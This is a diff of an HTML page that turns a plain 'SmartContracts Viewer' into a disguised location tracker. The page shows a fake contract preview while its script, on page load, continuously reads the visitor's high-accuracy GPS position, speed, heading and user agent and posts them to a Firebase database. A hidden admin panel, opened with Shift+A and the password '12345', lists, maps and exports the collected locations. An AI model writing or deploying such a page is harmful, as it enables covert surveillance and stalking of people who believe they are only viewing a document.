@@ -1,40 +1,192 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>SmartContracts Viewer</title>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Smart Contract Viewer</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f7f7f7;
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: #f2f2f2;
       color: #333;
+    }
+    header {
+      background: #004080;
+      color: white;
+      padding: 15px;
       text-align: center;
-      padding: 40px;
     }
-    h1 {
-      color: #444;
-    }
-    .card {
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      padding: 30px;
-      max-width: 400px;
+    .contract {
+      padding: 20px;
+      max-width: 800px;
       margin: auto;
+      background: white;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      margin-top: 30px;
+      border-radius: 10px;
     }
-    p {
-      font-size: 15px;
-      color: #777;
+    .contract h2 {
+      color: #004080;
+    }
+    .admin-panel {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      color: white;
+      padding: 20px;
+      overflow-y: auto;
+      z-index: 9999;
+    }
+    .admin-panel table {
+      width: 100%;
+      margin-top: 20px;
+      border-collapse: collapse;
+      font-size: 14px;
+    }
+    .admin-panel table, th, td {
+      border: 1px solid #888;
+      padding: 8px;
+    }
+    .admin-panel h2 {
+      color: #00ffcc;
+    }
+    .btn {
+      background: #00ffcc;
+      color: #000;
+      border: none;
+      padding: 10px 15px;
+      margin: 10px 5px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
+  <header>
+    <h1>SmartCheck Contract Viewer</h1>
+  </header>
 
-  <div class="card">
-    <h1>SmartContracts Viewer</h1>
-    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
+  <div class="contract">
+    <h2>Document: SC-024/NGX-CON</h2>
+    <p><strong>Status:</strong> Active</p>
+    <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
+    <p><strong>Effective Date:</strong> August 1, 2025</p>
+    <p><strong>Parties Involved:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
+    <p><strong>Content Preview:</strong></p>
+    <div style="background:#eee;padding:15px;height:300px;overflow:auto;border:1px solid #ccc;border-radius:6px;">
+      This Contract Agreement ("Agreement") is entered into between GlobalChain Inc. and SmartCheck Solutions...
+      <br/><br/>
+      Section 1: Terms & Conditions...<br/>
+      Section 2: Payment Schedule...<br/>
+      Section 3: Liability Clause...<br/>
+      Section 4: Signature Authorization...
+      <br/><br/>
+      [Digital Signature Verified ✅]
+    </div>
+  </div>
+
+  <div class="admin-panel" id="adminPanel">
+    <h2>Admin Panel – Location Logs</h2>
+    <button class="btn" onclick="clearLogs()">🗑 Clear Logs</button>
+    <button class="btn" onclick="exportCSV()">📁 Export CSV</button>
+    <table id="logTable">
+      <thead>
+        <tr>
+          <th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th><th>Map</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <script>
+    const dbURL = "https://gps-d0bab-default-rtdb.firebaseio.com/locations.json";
+
+    function logLocation(pos) {
+      const data = {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        speed: pos.coords.speed || "N/A",
+        direction: pos.coords.heading || "N/A",
+        time: new Date().toISOString(),
+        ua: navigator.userAgent
+      };
+      fetch(dbURL, {
+        method: "POST",
+        body: JSON.stringify(data)
+      });
+    }
+
+    function fetchLogs() {
+      fetch(dbURL)
+        .then(res => res.json())
+        .then(data => {
+          const tbody = document.querySelector("#logTable tbody");
+          tbody.innerHTML = "";
+          for (let id in data) {
+            const d = data[id];
+            const row = `<tr>
+              <td>${new Date(d.time).toLocaleString()}</td>
+              <td>${d.lat}</td><td>${d.lng}</td>
+              <td>${d.speed}</td><td>${d.direction}</td>
+              <td>${d.ua?.slice(0, 30)}...</td>
+              <td><a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank">Map</a></td>
+            </tr>`;
+            tbody.innerHTML += row;
+          }
+        });
+    }
+
+    function clearLogs() {
+      if (confirm("Clear all location logs?")) {
+        fetch("https://gps-d0bab-default-rtdb.firebaseio.com/locations.json", { method: "DELETE" })
+        .then(() => fetchLogs());
+      }
+    }
+
+    function exportCSV() {
+      fetch(dbURL).then(res => res.json()).then(data => {
+        let csv = "Time,Latitude,Longitude,Speed,Direction,UserAgent\n";
+        for (let id in data) {
+          let d = data[id];
+          csv += `"${d.time}","${d.lat}","${d.lng}","${d.speed}","${d.direction}","${d.ua}"\n`;
+        }
+        const blob = new Blob([csv], { type: "text/csv" });
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "location_logs.csv";
+        a.click();
+      });
+    }
+
+    // Admin Panel Unlock
+    let shiftPressed = false;
+    document.addEventListener("keydown", e => {
+      if (e.key === "Shift") shiftPressed = true;
+      if (shiftPressed && e.key.toLowerCase() === "a") {
+        const pass = prompt("Enter admin password:");
+        if (pass === "12345") {
+          document.getElementById("adminPanel").style.display = "block";
+          fetchLogs();
+          setInterval(fetchLogs, 8000);
+        } else {
+          alert("Incorrect password");
+        }
+      }
+    });
+    document.addEventListener("keyup", e => {
+      if (e.key === "Shift") shiftPressed = false;
+    });
+
+    // Start GPS tracking
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(logLocation);
+      navigator.geolocation.watchPosition(logLocation, null, { enableHighAccuracy: true });
+    }
+  </script>
+</body>
+                                                            </html>    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
     <p><i>Loading contract document...</i></p>
   </div>
 
